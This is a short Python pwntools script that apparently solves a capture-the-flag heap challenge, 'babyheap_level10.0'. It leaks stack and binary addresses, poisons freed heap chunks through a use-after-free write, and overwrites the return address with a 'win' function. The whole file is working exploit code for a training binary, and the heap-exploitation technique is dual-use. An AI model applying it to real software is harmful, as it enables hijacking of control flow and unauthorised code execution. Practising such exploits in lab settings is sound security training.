from pwn import *

# Start the process for the given binary
p = process("/challenge/babyheap_level10.0")
# Load the binary ELF for symbol resolution
binary = ELF("/challenge/babyheap_level10.0")

def malloc_to_1(loc: bytes):
    # Allocate two memory blocks, free them, then allocate and setup new blocks
    p.sendline(b'malloc')
    p.sendline(b'0')
    p.sendline(b'100')  # Allocate 100 bytes
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'100')  # Allocate another 100 bytes
    p.sendline(b'free')
    p.sendline(b'0')    # Free the first allocation
    p.sendline(b'free')
    p.sendline(b'1')    # Free the second allocation

    p.sendline(b'scanf')
    p.sendline(b'1')    # Set up scanf
    p.recv()            # Receive any prompt
    p.sendline(loc)     # Send the location for the memory leak
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'100')  # Allocate 100 bytes in the third block
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'100')  # Allocate another 100 bytes

def scanf_to_pos(buf: bytes, pos: bytes):
    # Send the position and buffer to scanf
    p.sendline(b'scanf')
    p.sendline(pos)     # Send the position to scanf
    p.recv()            # Receive any prompt
    p.sendline(buf)     # Send the buffer to scanf
    p.recv()            # Receive the result

# Leak stack address
p.recvuntil(b'LEAK')
p.recvuntil(b'at: ')
stack_leak = p.recvuntil(b'.')[:-1]
ret_addr = int(stack_leak, 16) + 0x118  # Compute the return address

# Leak main address
p.recvuntil(b'LEAK')
p.recvuntil(b'at: ')
main_leak = p.recvuntil(b'.')[:-1]
binary_base = int(main_leak, 16) - binary.sym.main  # Compute base address of binary
binary.address = binary_base

# Perform the memory manipulation
malloc_to_1(p64(ret_addr))
scanf_to_pos(p64(binary.sym.win), b'1')
p.sendline(b'quit')

# Interact with the process
p.interactive()
